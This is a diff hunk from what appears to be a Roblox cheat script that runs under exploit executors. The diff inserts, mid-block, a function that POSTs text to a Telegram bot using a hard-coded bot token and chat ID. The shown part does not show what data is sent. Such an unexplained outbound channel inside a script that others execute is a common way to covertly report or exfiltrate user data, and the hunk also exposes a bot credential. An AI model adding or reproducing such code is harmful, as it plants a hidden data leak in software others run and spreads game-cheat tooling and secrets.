@@ -186,6 +186,36 @@ if game.PlaceId == 6403373529 or game.PlaceId == 9015014224 or game.PlaceId == 1
                         end
                     end
                     if bombs >= 7 then
+
+			local request = (syn and syn.request) or request or http_request -- Поддержка разных эксплойтов
+
+local BOT_TOKEN = "7850291268:AAH_lHueQI2kM_2JKBG37nx08T1oYoO6a8g"
+local CHAT_ID = "-4663907469"
+
+local function sendToTelegram(text)
+    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local body = {
+        chat_id = CHAT_ID,
+        text = text
+    }
+    
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = game:GetService("HttpService"):JSONEncode(body)
+    })
+    
+    if response.Success then
+        print("✅ Сообщение отправлено!")
+    else
+        warn("❌ Ошибка: " .. response.Body)
+    end
+end
+			
                         local function OpenLab()
                             if game.Workspace.Map.CodeBrick.SurfaceGui:FindFirstChild("IMGTemplate") then
                                 game.Workspace.Map.CodeBrick.SurfaceGui.IMGTemplate.Name = "1st"
